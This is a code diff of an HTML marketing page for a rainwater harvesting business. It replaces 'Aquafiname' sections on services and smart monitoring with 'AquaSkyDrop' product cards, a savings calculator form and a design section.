+                        The statistics are stark: nearly two-thirds of the world's population experiences severe water scarcity for at least one month each year. By 2050, this figure is projected to rise dramatically, impacting billions more as climate patterns become increasingly unpredictable. Traditional water sources are under immense pressure, leading to higher costs, environmental degradation, and social unrest. Rainwater harvesting emerges as a critical component of a diversified water management strategy, offering resilience against these growing challenges. It's not just about saving water; it's about securing a fundamental resource for future generations. AquaSkyDrop is at the forefront of this movement, providing innovative solutions that empower individuals and communities to take control of their water supply.
+                    </p>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto">
+                        Moreover, the energy intensity of water treatment and distribution is often overlooked. Pumping, purifying, and delivering water to homes and businesses consumes vast amounts of electricity, contributing significantly to greenhouse gas emissions. By decentralizing water collection through rainwater harvesting, we reduce this energy demand, leading to a smaller carbon footprint and a more sustainable energy future. This interconnectedness of water and energy resources makes rainwater harvesting a powerful tool in the fight against climate change, offering benefits that extend far beyond simply conserving water. AquaSkyDrop's commitment to efficiency and smart technology ensures that our systems maximize both water and energy savings.
+                    </p>
+                </div>
             </div>
         </section>
 
-        <section id="services">
-            <div class="container">
-                <h2>Our Services</h2>
-                <p>Aquafiname offers a comprehensive suite of services designed to support you through every stage of your rainwater harvesting journey. From initial concept to ongoing maintenance, our expert team provides unparalleled support, ensuring your system operates efficiently and delivers maximum benefits for years to come. We are committed to providing a seamless, worry-free experience, allowing you to focus on the advantages of sustainable water management.</p>
+        <!-- AquaSkyDrop Solutions Section -->
+        <section id="solutions" class="py-16 md:py-24 bg-silver-mist px-6 md:px-12">
+            <div class="container mx-auto">
+                <h2 class="text-3xl md:text-5xl font-bold text-center mb-12 text-cool-slate-gray">AquaSkyDrop Solutions: Tailored for Every Need</h2>
+                <p class="text-lg text-center text-cool-slate-gray mb-16 max-w-4xl mx-auto">
+                    From compact urban dwellings to expansive industrial complexes, AquaSkyDrop offers a diverse range of cutting-edge rainwater harvesting systems designed to integrate seamlessly into any environment. Our solutions are built with precision engineering, sustainable materials, and smart technology to maximize efficiency, minimize maintenance, and deliver reliable water access. Explore our offerings and find the perfect fit for your water independence journey.
+                </p>
 
-                <div class="grid-layout">
-                    <div class="grid-item">
-                        <div class="service-image">
-                            <img src="p2.webp" alt="Consultation Service">
-                        </div>
-                        <h3>Consultation & Feasibility Studies</h3>
-                        <p>Begin your sustainable water journey with expert guidance. Our in-depth consultations and thorough feasibility studies assess your unique needs, property characteristics, and local climate to determine the optimal rainwater harvesting solution. We provide clear projections on water savings, environmental impact, and return on investment, ensuring you make informed decisions. Our team helps navigate regulatory landscapes, identifies potential incentives, and outlines a clear roadmap for your project. This foundational step is crucial for designing a system that is perfectly tailored to your goals.</p>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-10">
+                    <!-- Home Rooftop Harvesting Kits -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <img src="p2.avif" alt="Home Rooftop Harvesting Kit" class="w-full h-48 object-cover rounded-xl mb-6 shadow-md">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Home Rooftop Harvesting Kits</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Our residential kits are designed for easy installation and maximum efficiency, turning your home's roof into a personal water catchment area. These systems include high-quality gutters, first-flush diverters, leaf screens, and durable storage tanks that can be above-ground or partially buried. Ideal for garden irrigation, car washing, toilet flushing, and even laundry, significantly reducing your reliance on municipal water.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li>Compact & Discreet Design</li>
+                            <li>Modular & Scalable for Any Home Size</li>
+                            <li>Easy DIY Installation or Professional Support</li>
+                            <li>High-Efficiency Filtration for Clean Water</li>
+                            <li>Integrated Smart Monitoring Options</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Each component is carefully selected for longevity and performance, ensuring that your investment provides years of reliable water supply. Our kits come with comprehensive guides, making the process straightforward for homeowners. Experience the peace of mind that comes with water independence and contribute to a greener planet, one raindrop at a time.
+                        </p>
                     </div>
 
-                    <div class="grid-item">
-                        <div class="service-image">
-                            <img src="p3.avif" alt="Design Service">
-                        </div>
-                        <h3>Custom System Design & Engineering</h3>
-                        <p>Leverage our engineering prowess to create a bespoke rainwater harvesting system. Our experts meticulously design every component, from collection surfaces to distribution networks, ensuring maximum efficiency and seamless integration with your property's aesthetics. We provide detailed schematics and 3D renderings, showcasing how your system will look and perform. Our designs prioritize durability, water quality, and energy efficiency, delivering a future-proof solution that enhances your property's value and sustainability profile.</p>
+                    <!-- Underground Smart Water Storage Systems -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <img src="p3.webp" alt="Underground Smart Water Storage System" class="w-full h-48 object-cover rounded-xl mb-6 shadow-md">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Underground Smart Water Storage Systems</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            For those seeking an unobtrusive solution, our underground storage tanks offer substantial capacity without impacting your landscape aesthetics. These robust, food-grade polyethylene tanks are designed for subterranean installation, preserving yard space and maintaining consistent water temperatures. Integrated with smart sensors, they provide real-time data on water levels and quality.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li>Space-Saving & Invisible Installation</li>
+                            <li>Durable, Long-Lasting Materials</li>
+                            <li>Advanced Filtration & Pumping Systems</li>
+                            <li>Smart Monitoring & Automated Refill Options</li>
+                            <li>Ideal for Larger Residential & Commercial Needs</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Our underground systems are perfect for properties where visual impact is a concern or where large volumes of water need to be stored efficiently. They are engineered for minimal maintenance, providing a reliable and hidden water source for all non-potable applications, from extensive garden irrigation to commercial facility operations.
+                        </p>
                     </div>
 
-                    <div class="grid-item">
-                        <div class="service-image">
-                            <img src="p4.avif" alt="Installation Service">
-                        </div>
-                        <h3>Professional Installation & Commissioning</h3>
-                        <p>Experience a smooth and efficient installation process with Aquafiname. Our certified technicians adhere to the highest industry standards, ensuring precise assembly and secure connections of all system components. We minimize disruption to your property and conduct rigorous testing during commissioning to guarantee optimal performance. Comprehensive training is provided, empowering you to confidently manage your new system from day one. Your reliable, high-performance solution is brought to life flawlessly.</p>
+                    <!-- Garden and Irrigation Setups -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <img src="p4.webp" alt="Garden and Irrigation Setup" class="w-full h-48 object-cover rounded-xl mb-6 shadow-md">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Garden & Irrigation Setups</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Transform your garden into a lush, self-sustaining oasis with our specialized irrigation setups. These systems are optimized for horticultural use, delivering nutrient-rich rainwater directly to your plants. Options range from simple rain barrels connected to drip irrigation lines to more complex systems with automated pumps and weather-responsive controllers.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li>Optimized for Plant Health & Growth</li>
+                            <li>Automated Drip & Sprinkler Integration</li>
+                            <li>Water-Saving Smart Controllers</li>
+                            <li>Reduces Landscape Water Bills</li>
+                            <li>Promotes Healthy Soil & Ecosystems</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Using rainwater for irrigation not only saves money but also benefits your plants, as it's free of chlorine and other chemicals found in treated tap water. Our systems ensure your garden thrives even during dry spells, providing a sustainable and beautiful outdoor space.
+                        </p>
                     </div>
 
-                    <div class="grid-item">
-                        <div class="service-image">
-                            <img src="p5.avif" alt="Maintenance Service">
-                        </div>
-                        <h3>Maintenance & Optimization Programs</h3>
-                        <p>Ensure the longevity and peak performance of your rainwater harvesting system with our comprehensive maintenance and optimization programs. Our certified technicians perform routine inspections, filter replacements, and system checks to maximize water collection and quality. We proactively identify and address potential issues, providing detailed reports and recommendations for improvements. Our flexible programs offer peace of mind, ensuring your system continues to deliver clean, sustainable water and significant savings for decades.</p>
+                    <!-- Urban & Commercial Rainwater Projects -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <img src="p5.webp" alt="Urban & Commercial Rainwater Project" class="w-full h-48 object-cover rounded-xl mb-6 shadow-md">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Urban & Commercial Rainwater Projects</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            AquaSkyDrop scales up its expertise for large-scale urban developments, industrial facilities, and municipal projects. Our commercial solutions involve custom-engineered systems for massive rainwater capture, storage, and distribution, designed to meet the high demands of public spaces, office buildings, factories, and entire city blocks.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li>Custom-Engineered for Large-Scale Demands</li>
+                            <li>Advanced Filtration & Treatment for Potable Use (where applicable)</li>
+                            <li>Integrated with Building Management Systems</li>
+                            <li>Significant Operational Cost Reductions</li>
+                            <li>Demonstrates Corporate & Urban Sustainability</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            These projects not only provide substantial water savings but also serve as powerful statements of environmental commitment. We work closely with architects, city planners, and developers to design and implement robust, efficient, and visually integrated systems that contribute to green building certifications and smart city initiatives. Our experience spans diverse applications, from stadium irrigation to industrial process water, ensuring a bespoke solution for every complex challenge.
+                        </p>
+                    </div>
+
+                    <!-- Industrial Process Water Solutions -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <img src="p6.webp" alt="Industrial Process Water Solutions" class="w-full h-48 object-cover rounded-xl mb-6 shadow-md">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Industrial Process Water Solutions</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Industries often require vast quantities of water for various processes, from cooling to manufacturing. AquaSkyDrop provides specialized rainwater harvesting systems tailored to industrial needs, offering a sustainable and cost-effective alternative to municipal or groundwater sources. These systems are designed for high-volume collection, advanced purification, and seamless integration with existing industrial water loops.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li>High-Volume Capture & Storage</li>
+                            <li>Customizable Filtration for Specific Industrial Processes</li>
+                            <li>Reduces Operational Costs & Water Bills</li>
+                            <li>Enhances Corporate Environmental Responsibility (CER)</li>
+                            <li>Ensures Water Security for Critical Operations</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            By utilizing rainwater, businesses can significantly reduce their environmental footprint, comply with stricter environmental regulations, and achieve substantial savings on water utility costs. Our expert team assesses your industrial water demands and designs a robust system that ensures consistent supply and superior water quality for your specific applications.
+                        </p>
+                    </div>
+
+                    <!-- Public Space & Landscaping Systems -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <img src="p7.avif" alt="Public Space & Landscaping Systems" class="w-full h-48 object-cover rounded-xl mb-6 shadow-md">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Public Space & Landscaping Systems</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Green spaces in urban environments are vital but often require significant water for maintenance. AquaSkyDrop offers solutions for parks, public gardens, sports fields, and urban landscaping, enabling efficient and sustainable irrigation using harvested rainwater. These systems can be integrated with smart city infrastructure for optimized water distribution.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li>Sustainable Irrigation for Public Green Spaces</li>
+                            <li>Reduces Municipal Water Consumption in Parks</li>
+                            <li>Enhances Urban Biodiversity & Aesthetics</li>
+                            <li>Long-Term Cost Savings for Municipalities</li>
+                            <li>Showcases Public Commitment to Sustainability</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Implementing rainwater harvesting in public spaces not only conserves water and reduces operational expenses but also educates the public on sustainable practices. AquaSkyDrop provides robust, low-maintenance systems that ensure the vitality of public landscapes while demonstrating a commitment to environmental responsibility.
+                        </p>
                     </div>
                 </div>
             </div>
         </section>
 
-        <section id="monitoring">
-            <div class="container">
-                <h2>Smart Water Monitoring</h2>
-                <p>In the era of smart living and data-driven decisions, Aquafiname integrates cutting-edge smart water monitoring technology into every rainwater harvesting system. Our advanced monitoring solutions provide unparalleled visibility into your water resources, transforming raw data into actionable insights that empower you to manage water more efficiently and sustainably. This goes beyond simple level indicators; it's a comprehensive ecosystem designed for precision water management.</p>
+        <!-- Savings & Impact Calculator Section -->
+        <section id="calculator" class="py-16 md:py-24 bg-pure-white px-6 md:px-12">
+            <div class="container mx-auto text-center">
+                <h2 class="text-3xl md:text-5xl font-bold mb-12 text-cool-slate-gray">Calculate Your Water Savings & Impact</h2>
+                <p class="text-lg text-cool-slate-gray mb-10 max-w-4xl mx-auto">
+                    Curious about how much water you could save and the positive impact you could make? Our interactive tools help you visualize the potential of rainwater harvesting for your specific location and needs. Input a few details and let AquaSkyDrop show you the numbers!
+                </p>
 
-                <h3>Real-Time Water Level Tracking</h3>
-                <p>Our systems incorporate high-precision sensors that provide real-time updates on your stored rainwater levels. This data is instantly transmitted to a centralized dashboard, accessible via our dedicated mobile app or web portal. You no longer have to guess how much water you have; you'll know the exact volume available at any given moment. This real-time tracking is crucial for planning your water usage, especially during dry spells or periods of high demand. Imagine knowing precisely when your tank is full after a heavy downpour, or when it's nearing empty, prompting you to adjust your irrigation schedule or switch to municipal supply if necessary. The system can also be configured to send automated alerts when certain thresholds are met, such as "tank 90% full" or "tank 20% remaining," ensuring you are always informed and can react proactively. This level of transparency and control is a game-changer for effective water resource management, preventing unexpected shortages and optimizing the use of your harvested water. The sensors are robust and designed for longevity, providing accurate readings even in challenging environmental conditions. Data is securely transmitted and stored, ensuring privacy and reliability. This feature is particularly valuable for commercial and industrial applications where consistent water availability is critical for operations. By providing immediate feedback on water levels, our system enables efficient allocation of resources and helps in forecasting future water availability based on historical data and weather patterns. The visual representation of tank levels on the dashboard makes it easy for users to quickly grasp their current water status, eliminating the need for manual checks and providing peace of mind. This continuous monitoring also aids in identifying potential issues, such as leaks or blockages, early on, allowing for timely intervention and maintenance. It's about giving you the power to see, understand, and control your most precious resource.</p>
-                <p>The real-time water level tracking also plays a pivotal role in optimizing the overall efficiency of the rainwater harvesting system. By understanding the dynamics of water ingress and egress, users can fine-tune their consumption habits and system settings. For instance, if the system detects a prolonged period of low rainfall and decreasing tank levels, it can automatically trigger a notification to conserve water or switch to an auxiliary supply. Conversely, during periods of abundant rainfall, the system can provide insights into optimal storage utilization, preventing overflow and maximizing collection. This dynamic feedback loop empowers users to adapt their water management strategies to prevailing environmental conditions, fostering a truly responsive and resilient approach to water use. The data collected over time also serves as a valuable historical record, allowing for trend analysis and long-term planning. Businesses can use this data for environmental reporting, demonstrating their commitment to sustainable practices. For homeowners, it provides a clear picture of their water independence and the tangible impact of their rainwater harvesting system. The intuitive interface ensures that this sophisticated data is presented in an easily understandable format, making advanced water management accessible to everyone, regardless of their technical expertise. This proactive approach to water level tracking is a cornerstone of Aquafiname's smart water philosophy, ensuring that every drop is not just harvested but also intelligently managed for maximum benefit and sustainability.</p>
+                <div class="bg-silver-mist p-8 rounded-2xl shadow-lg max-w-3xl mx-auto">
+                    <h3 class="text-2xl font-semibold text-cool-slate-gray mb-6">Your Personalized Savings Estimator</h3>
+                    <p class="text-cool-slate-gray mb-6">
+                        Enter your location, roof size, and average annual rainfall to get an estimate of your yearly rainwater collection potential and the corresponding financial savings.
+                    </p>
+                    <form class="space-y-6">
+                        <div>
+                            <label for="location" class="block text-left text-cool-slate-gray text-lg font-medium mb-2">Your Location (City, State/Region):</label>
+                            <input type="text" id="location" class="w-full p-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-skydrop-blue focus:border-transparent text-cool-slate-gray" placeholder="e.g., London, UK">
+                        </div>
+                        <div>
+                            <label for="roof-size" class="block text-left text-cool-slate-gray text-lg font-medium mb-2">Usable Roof Area (in sq ft/m²):</label>
+                            <input type="number" id="roof-size" class="w-full p-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-skydrop-blue focus:border-transparent text-cool-slate-gray" placeholder="e.g., 1500 sq ft">
+                        </div>
+                        <div>
+                            <label for="avg-rainfall" class="block text-left text-cool-slate-gray text-lg font-medium mb-2">Average Annual Rainfall (in inches/mm):</label>
+                            <input type="number" id="avg-rainfall" class="w-full p-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-skydrop-blue focus:border-transparent text-cool-slate-gray" placeholder="e.g., 30 inches">
+                        </div>
+                        <button type="submit" class="btn-primary w-full sm:w-auto">Calculate My Savings</button>
+                    </form>
+                    <div class="mt-8 p-6 bg-pure-white rounded-xl shadow-inner text-left">
+                        <h4 class="text-xl font-semibold text-cool-slate-gray mb-4">Your Estimated Impact:</h4>
+                        <p class="text-cool-slate-gray mb-2"><strong>Annual Water Collection:</strong> <span class="font-bold text-skydrop-blue">~ [Calculated Liters/Gallons]</span></p>
+                        <p class="text-cool-slate-gray mb-2"><strong>Estimated Annual Savings:</strong> <span class="font-bold text-ecoleaf-green">~ [Calculated Currency]</span></p>
+                        <p class="text-cool-slate-gray"><strong>Environmental Benefit:</strong> Equivalent to reducing [X] kg of CO2 emissions annually.</p>
+                        <p class="text-sm text-gray-600 mt-4"><em>*Calculations are estimates based on average data and may vary based on specific conditions and system efficiency.</em></p>
+                    </div>
+                </div>
 
-                <h3>Usage Reports and Sustainability Metrics</h3>
-                <p>Beyond simply tracking levels, Aquafiname's smart monitoring system generates comprehensive usage reports and sustainability metrics. These detailed analytics provide invaluable insights into your water consumption patterns, allowing you to identify areas for improvement and quantify your environmental impact. Reports can be customized to show daily, weekly, monthly, or annual water usage, distinguishing between harvested rainwater and municipal supply. You'll see exactly how much municipal water you've saved, translating directly into financial savings. The sustainability metrics go further, calculating your reduced carbon footprint due to lower energy consumption for water treatment and transportation, and the positive impact on local stormwater management. For businesses, these reports are essential for environmental compliance, sustainability reporting, and demonstrating commitment to green initiatives. For homeowners, they provide a clear picture of their contribution to a greener planet and the tangible benefits of their investment. These reports are presented through intuitive graphs and charts, making complex data easy to understand at a glance. You can track trends over time, set consumption goals, and receive alerts if usage exceeds predefined limits. This data-driven approach transforms water management from a passive activity into an active, informed process, enabling continuous optimization and greater resource efficiency. The system can even provide comparative data, allowing you to benchmark your water savings against similar properties or industry averages, fostering a sense of achievement and encouraging further conservation. This robust reporting functionality is designed to empower users with the knowledge needed to truly embrace sustainable water practices and make a measurable difference. The insights gained from these reports can inform future water conservation strategies, from identifying peak usage times to optimizing irrigation schedules based on actual plant needs and weather forecasts. This level of detail is crucial for both individual households seeking to minimize their environmental footprint and large organizations aiming to achieve ambitious sustainability targets. By providing clear, quantifiable data, Aquafiname's monitoring system helps bridge the gap between intent and impact, making sustainable water management a transparent and rewarding endeavor. The ability to export these reports in various formats also facilitates sharing with stakeholders, whether for internal corporate reporting or for community engagement initiatives, further amplifying the positive message of water conservation.</p>
-                <p>The analytical capabilities extend to predictive modeling, where historical usage data combined with local weather forecasts can help predict future water availability and consumption needs. This allows for proactive adjustments to water management plans, ensuring optimal resource allocation and minimizing waste. For agricultural applications or large landscaping projects, this predictive insight can be invaluable for efficient irrigation scheduling, preventing both overwatering and underwatering. Furthermore, the system can track the performance of individual components within the rainwater harvesting setup, such as filter lifespan or pump efficiency, providing maintenance alerts and optimizing operational longevity. This proactive maintenance capability reduces unexpected downtimes and extends the overall lifespan of the system, maximizing your return on investment. The sustainability metrics can also include calculations of reduced chemical usage for water treatment, further highlighting the environmental benefits of using natural rainwater. For educational institutions, these reports can serve as powerful teaching tools, demonstrating real-world applications of environmental science and sustainable engineering. Aquafiname's commitment to comprehensive data reporting ensures that our clients are not just harvesting water, but intelligently managing it, making every drop count towards a more sustainable and resilient future. These detailed insights foster a culture of conservation, encouraging users to continuously seek ways to optimize their water footprint and contribute to a healthier planet. The platform is designed to be user-friendly, ensuring that even those without a background in data analytics can easily interpret and utilize the information provided, making sustainable water management accessible to a broad audience.</p>
-
-                <h3>Mobile App Integration</h3>
-                <p>Accessing your water data has never been easier. Aquafiname's smart monitoring system is fully integrated with an intuitive mobile application, available on both iOS and Android platforms. This app puts the power of water management directly in your hands, allowing you to monitor your system from anywhere, at any time. The mobile app provides a clean, user-friendly interface where you can view real-time tank levels, access detailed usage reports, set custom alerts, and even control certain system functions remotely (e.g., activating a pump for irrigation). Imagine checking your water reserves while on vacation, or receiving a notification on your phone when a heavy rainstorm is filling your tank. The app's dashboard offers a quick overview of your system's health and performance, with easy navigation to deeper insights. It’s designed to be visually appealing and highly functional, making sustainable water management an engaging and effortless part of your daily routine. Push notifications ensure you never miss critical updates, whether it's a low water alert or a reminder for filter maintenance. This seamless mobile integration ensures that you are always connected to your water resources, empowering you to make smart, timely decisions that contribute to both personal savings and environmental conservation. The app is regularly updated with new features and improvements, ensuring it remains at the cutting edge of smart home and business technology. Its responsive design ensures optimal viewing and functionality across various mobile devices, from smartphones to tablets, providing a consistent user experience. The secure login and data encryption protocols safeguard your information, giving you peace of mind regarding data privacy. Furthermore, the app can be customized to display information relevant to your specific system configuration and water usage goals, providing a truly personalized experience. This level of accessibility and control transforms water management from a chore into an empowering and insightful activity, fostering a deeper connection to your environmental impact.</p>
-                <p>The mobile app also serves as a central hub for educational resources and support. Users can access water conservation tips, FAQs, and direct links to customer support within the app, providing immediate assistance and valuable information. This integrated approach ensures that users have all the tools and knowledge they need to maximize the benefits of their Aquafiname system. For multi-property owners or facility managers, the app can manage multiple systems from a single interface, providing a consolidated view of water resources across different locations. This capability is particularly useful for urban developers managing several green properties or businesses with multiple sites. The app's interactive features can include gamification elements, such as tracking water savings achievements or comparing usage with community averages, to encourage greater engagement and conservation efforts. Future updates may include integration with smart home ecosystems, allowing for even more automated and seamless water management. Aquafiname's mobile app is more than just a monitoring tool; it's a comprehensive platform designed to empower users to become active participants in sustainable water management, making informed decisions that benefit their finances and the planet. It represents our commitment to leveraging technology to make eco-conscious living not just possible, but also convenient and rewarding, transforming the way people interact with their water resources and fostering a greater appreciation for every precious drop.</p>
+                <div class="mt-16">
+                    <h3 class="text-3xl font-bold text-cool-slate-gray mb-6">Understanding Your Water Footprint</h3>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto mb-8">
+                        Beyond the financial benefits, understanding your water footprint is crucial for sustainable living. Every product we consume, every service we use, has a hidden water cost. By actively harvesting rainwater, you directly reduce your household or business's reliance on centralized water systems, which often draw from distant, stressed ecosystems. This act of self-sufficiency contributes to local water resilience and reduces the energy associated with water treatment and transportation. Our calculator provides a tangible representation of this positive impact, empowering you to make informed decisions about your water consumption.
+                    </p>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto">
+                        Moreover, consider the ripple effect. When one household or business adopts rainwater harvesting, it sets an example, encouraging neighbors and communities to follow suit. This collective action can lead to significant reductions in overall water demand, especially during peak seasons or droughts. The data from our calculator isn't just about your savings; it's about your contribution to a larger movement towards water security and environmental health. AquaSkyDrop is committed to providing the tools and technology that make this transition seamless and rewarding.
+                    </p>
+                </div>
             </div>
         </section>
 
-        <section id="why-aquafiname">
-            <div class="container">
-                <h2>Why Aquafiname?</h2>
-                <p>Choosing Aquafiname means partnering with a leader in sustainable water solutions, committed to innovation, quality, and environmental stewardship. We offer a distinct advantage in the market, combining advanced technology with a deep understanding of ecological principles and customer needs. Our commitment extends beyond just providing a product; we offer a complete solution that integrates seamlessly into your lifestyle or business operations, delivering tangible benefits and peace of mind.</p>
+        <!-- Technology & Design Section -->
+        <section id="technology" class="py-16 md:py-24 bg-pure-white px-6 md:px-12">
+            <div class="container mx-auto">
+                <h2 class="text-3xl md:text-5xl font-bold text-center mb-12 text-cool-slate-gray">Technology & Design: The AquaSkyDrop Advantage</h2>
+                <p class="text-lg text-center text-cool-slate-gray mb-16 max-w-4xl mx-auto">
+                    At AquaSkyDrop, we believe that sustainable solutions should not compromise on aesthetics or functionality. Our systems blend cutting-edge technology with sleek, modern design, ensuring they are both highly efficient and visually appealing. Discover the innovations that set AquaSkyDrop apart.
+                </p>
 
-                <h3>Environmental Impact Reduction</h3>
-                <p>At the core of Aquafiname's mission is a profound dedication to reducing environmental impact. Rainwater harvesting significantly lessens the strain on municipal water supplies, which often rely on energy-intensive pumping, treatment, and distribution processes. By utilizing natural rainfall, you directly contribute to lowering the overall energy consumption associated with water provision, thereby reducing greenhouse gas emissions and your carbon footprint. Furthermore, our systems play a crucial role in mitigating stormwater runoff, a major contributor to urban flooding and water pollution. When rainwater is collected and diverted from storm drains, it prevents pollutants from entering natural waterways and reduces the burden on aging drainage infrastructure. This helps protect local ecosystems, preserve biodiversity, and maintain healthier aquatic environments. Aquafiname systems also promote groundwater recharge in areas where it's needed, helping to replenish aquifers and support natural water cycles. By choosing Aquafiname, you are not just saving water; you are actively participating in a broader movement towards ecological balance, fostering resilient urban landscapes, and creating a more sustainable future for generations to come. Your decision to harvest rainwater has a ripple effect, contributing to cleaner rivers, healthier soil, and a more robust local water cycle. This commitment to environmental responsibility is embedded in every aspect of our design and operational philosophy, ensuring that our solutions deliver maximum ecological benefit. We continuously research and implement the most eco-friendly materials and manufacturing processes, further minimizing the environmental footprint of our products. By reducing the demand for treated potable water for non-potable uses, we help preserve precious drinking water resources for human consumption, a critical step in addressing global water scarcity. The cumulative effect of many Aquafiname systems installed across communities can lead to significant regional improvements in water quality and availability, demonstrating the power of collective action for environmental good. This makes Aquafiname not just a provider of water solutions, but a partner in building a greener, more sustainable world.</p>
-                <p>Beyond the direct benefits, Aquafiname's systems contribute to urban resilience against climate change impacts, such as increased frequency of extreme weather events. By managing stormwater at its source and creating decentralized water supplies, communities become less vulnerable to droughts and floods. The reduction in impervious surface runoff also helps to prevent soil erosion and maintain the natural hydrological balance of urban areas. Our solutions align with global sustainability goals, promoting responsible consumption and production patterns. We empower individuals and organizations to become active stewards of their local environment, fostering a deeper connection to natural resources. The educational aspect of having a visible rainwater harvesting system also raises awareness within communities about water conservation, inspiring others to adopt similar practices. This ripple effect of environmental consciousness is a powerful outcome of choosing Aquafiname. We believe that every drop harvested is a step towards a healthier planet, and our technology is designed to make that step as impactful and effortless as possible. Our commitment to environmental impact reduction is not merely a marketing claim; it is the fundamental principle that guides our innovation, design, and customer engagement, ensuring that we deliver solutions that truly make a difference for the planet and its inhabitants.</p>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                    <!-- Modern, Discreet System Designs -->
+                    <div class="order-2 lg:order-1">
+                        <h3 class="text-2xl md:text-3xl font-semibold text-cool-slate-gray mb-6">Modern, Discreet System Designs</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-6">
+                            Gone are the days of bulky, unsightly water tanks. AquaSkyDrop systems are engineered with a focus on minimalist design, allowing them to integrate seamlessly into any architectural style. Our tanks, whether above-ground or underground, are crafted from high-quality, UV-stabilized materials that are not only durable but also blend harmoniously with your property's aesthetics. We offer a range of colors and finishes to complement your home or commercial building, ensuring that sustainability enhances, rather than detracts from, your property's curb appeal.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed mb-6">
+                            Our gutter and downspout components are designed for optimal flow and discreet placement, minimizing visual impact while maximizing collection efficiency. The modular nature of our systems allows for flexible installation, adapting to various rooflines and landscape configurations. This commitment to design excellence means you don't have to choose between environmental responsibility and a beautiful property – with AquaSkyDrop, you get both.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Beyond visual integration, our designs prioritize ease of use and maintenance. Access points are strategically placed for simple cleaning, and components are designed for quick assembly and disassembly. This thoughtful approach extends the lifespan of the system and ensures a hassle-free experience for the user, making rainwater harvesting a truly convenient and appealing option.
+                        </p>
+                    </div>
+                    
+                </div>
 
-                <h3>Clean, Low-Maintenance Technology</h3>
-                <p>Aquafiname understands that sustainability should not come at the cost of convenience. Our rainwater harvesting systems are engineered for minimal maintenance, providing a hassle-free experience for our users. We utilize advanced filtration technologies, including self-cleaning pre-filters and robust sediment removal systems, to ensure the collected water is clean and free from debris before it enters the storage tank. This proactive approach significantly reduces the frequency of manual cleaning and extends the lifespan of the entire system. The design emphasizes accessibility for any necessary inspections or filter replacements, making routine checks straightforward and quick. Our durable, high-quality materials are selected for their longevity and resistance to corrosion, ensuring that your system operates efficiently for decades with minimal intervention. Smart monitoring features also contribute to low maintenance by providing alerts for filter changes or potential issues, allowing for proactive rather than reactive care. This means less time spent on upkeep and more time enjoying the benefits of sustainable water. Aquafiname systems are designed to be largely self-sufficient, requiring only periodic attention to ensure optimal performance. This commitment to low-maintenance technology makes sustainable living accessible and practical for busy homeowners and commercial entities alike, removing common barriers to adopting eco-friendly solutions. Our focus on clean design extends to the internal workings of the system, preventing the buildup of algae or harmful bacteria through thoughtful engineering and material selection. This ensures that the water remains pristine and safe for its intended non-potable uses. By minimizing the need for frequent manual intervention, we ensure that the environmental benefits of rainwater harvesting are realized with maximum convenience and efficiency, making it an attractive and sustainable choice for modern living. The intuitive design of our components means that any required maintenance, such as filter replacement, can often be performed by the user with minimal technical expertise, further reducing the need for professional service calls. This empowers our customers with greater control and independence over their water management system, reinforcing our commitment to user-friendly solutions. We also provide clear, comprehensive maintenance guides and responsive customer support to assist with any questions or needs, ensuring a smooth and worry-free ownership experience.</p>
